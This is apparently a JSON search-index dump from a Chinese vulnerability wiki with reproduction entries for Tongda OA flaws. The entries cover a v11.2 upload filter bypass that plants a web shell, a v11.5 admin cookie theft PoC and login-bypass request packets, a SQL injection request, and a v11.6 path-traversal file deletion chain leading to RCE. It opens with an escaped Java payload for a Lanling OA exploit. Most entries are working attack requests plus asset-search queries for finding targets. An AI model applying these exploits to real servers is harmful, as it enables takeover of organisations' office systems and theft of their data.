\\u0029\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0020\\u003d\\u0020\\u0028\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0029\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0067\\u0072\\u006f\\u0075\\u0070\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u0069\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u0069\\u0020\\u003c\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u003b\\u0020\\u0069\\u002b\\u002b\\u0029\\u0020\\u007b\\u0020\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0020\\u0074\\u0020\\u003d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u005b\\u0069\\u005d\\u003b\\u0069\\u0066\\u0020\\u0028\\u0074\\u0020\\u003d\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0028\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0065\\u0078\\u0065\\u0063\\u0022\\u0029\\u0020\\u007c\\u007c\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u0022\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0074\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0021\\u0028\\u006f\\u0062\\u006a\\u0020\\u0069\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u006f\\u0066\\u0020\\u0052\\u0075\\u006e\\u006e\\u0061\\u0062\\u006c\\u0065\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0069\\u0073\\u0024\\u0030\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0","date":"0001-01-01","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.2 upload.php 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.2后台存在文件上传漏洞，允许通过绕过黑名单的方法来上传恶意文件，导致服务器被攻击 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.2 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 通达OA v11.2下载链接 下载后按步骤安装即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 该漏洞存在于后台，需要通过登录后才能进行使用 登录后点击 菜单 -\u003e 系统管理 -\u003e 附件管理 点击添加附录存储管理添加如下(存储目录为 webroot 目录，默认为 D:/MYOA/webroot/) 点击 组织 -\u003e 系统管理员 -\u003e 上传附件 抓包使用 windows 的绕过方法 shell.php -\u003e shell.php. 2012 为目录 1717872192 为拼接的文件名 最后的shell名字为 1717872192.shell.php 访问木马文件 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.2-upload.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.5 login_code.php 任意用户登录 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"categories":null,"content":"漏洞描述 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"categories":null,"content":"漏洞影响 通达OA 2017版 通达OA版本 V11.X \u003c V11.5 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"categories":null,"content":"环境搭建 漏洞环境下载 https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe 双击安装即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"categories":null,"content":"漏洞复现 使用POC 获取管理员的Cookie root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ 成功获得Cookie,添加Cookie访问 http://xxx.xxx.xxx.xxx/general/index.php?isIE=0\u0026modify_pwd=0 即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"categories":null,"content":"漏洞POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64;","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"},{"categories":null,"content":"通达OA v11.5 logincheck_code.php 登陆绕过漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.8 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 发送第一个请求包 GET /general/login_code.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 再发送第二个恶意请求 POST /logincheck_code.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 56 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D\u0026UID=1 获取cookie后访问管理员页面 /general/index.php ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.5 swfupload_new.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.5 swfupload_new.php 文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.5 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 发送请求包触发漏洞 POST /general/file_folder/swfupload_new.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 355 Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2 Accept-Encoding: gzip ------------GFioQpMK0vv2 Content-Disposition: form-data; name=\"ATTACHMENT_ID\" 1 ------------GFioQpMK0vv2 Content-Disposition: form-data; name=\"ATTACHMENT_NAME\" 1 ------------GFioQpMK0vv2 Content-Disposition: form-data; name=\"FILE_SORT\" 2 ------------GFioQpMK0vv2 Content-Disposition: form-data; name=\"SORT_ID\" ------------GFioQpMK0vv2-- ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.5-swfupload_new.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.6 print.php 任意文件删除\u0026RCE ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/"},{"categories":null,"content":"漏洞描述 通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/"},{"categories":null,"content":"漏洞影响 通达OA v11.6 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/"},{"categories":null,"content":"环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/"},{"categories":null,"content":"漏洞复现 使用解密工具 SeayDzend(zend解密工具) 对通达OA的加密代码进行解密 解密工具已经放在目录下的POC目录中 解密完成后查看 webroot\\general\\data_center\\utils\\upload.php 文件 \u003c?php include_once \"inc/auth.inc.php\"; include_once \"./utils.func.php\"; $HTML_PAGE_TITLE = _(\"上传文件\"); include_once \"inc/header.inc.php\"; $error = \"\"; $msg = \"\"; if ($action == \"upload\") { if ($filetype == \"xls\") { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/templates/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/templates\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/templates\"); } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $_FILES[\"FILE1\"][\"name\"])) { } } else if ($filetype == \"img\") { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/images/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/images\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/images\"); } $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $p = strrpos($s_n, \".\"); $s_n = CreateId() . substr($s_n, $p); } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") \u0026\u0026 ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i \u003c count($arr); $i++) { $p = strpos($arr[$i], \".\"); $repno = substr($arr[$i], 0, $p); $repkid = GetRepKIDByNo($repno); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); break; } } } } } else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } } @unlink($_FILES[\"FILE1\"]); } else if ($action == \"unupload\") { if ($filetype == \"xls\") { $uploaddir = MYOA_ATTACH_PATH . \"data_center/attachment/\" . trim($filename) . \".xls\"; if (is_file($uploaddir)) { unlink($uploaddir); } } else if ($filetype == \"img\") { $uploaddir = MYOA_ATTACH_PATH . \"data_center/images/\" . trim($filename); if (is_file($uploaddir)) { unlink($uploaddir); } } else if ($filetype == \"attach\") { $uploaddir = MYOA_ATTACH_PATH . \"data_center/attachment/\" . trim($filename); if (is_file($uploaddir)) { unlink($uploaddir); } } } echo \"{\"; echo \"new_name:'$s_n',\\n\"; echo \"error: '\" . $error . \"',\\n\"; echo \"msg: '\" . $msg . \"'\\n\"; echo \"}\"; echo \"\u003cbody\u003e\\r\\n\u003c/body\u003e\\r\\n\u003c/html\u003e\"; ?\u003e 在第一行包含了文件 auth.inc.php include_once \"inc/auth.inc.php\"; 可以看到这个文件用于检验是否登录，未登录的情况无法利用这个漏洞 查看 \\webroot\\module\\appbuilder\\assets\\print.php文件 \u003c?php $s_tmp = __DIR__ . \"/../../../../logs/appbuilder/logs\"; $s_tmp .= \"/\" . $_GET[\"guid\"]; if (file_exists($s_tmp)) { $arr_data = unserialize(file_get_contents($s_tmp)); unlink($s_tmp); $s_user = $arr_data[\"user\"]; } else { echo \"未知参数\"; exit(); } 这里可以看到 页面获取 guid参数的值 使用file_exists函数判断文件是否存在 并未进行校验 就执行unlink删除文件 可以本地在 \\webroot\\inc 目录创建 1.txt 文件 然后访问 http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt 就会删除这个 1.txt 文件，也代表可以删除 auth.inc.php 登录检验文件 回到 upload.php 文件进行代码审计 判断变量 $action 是否为 upload，再判断文件类型，如果不为 xls 和 img 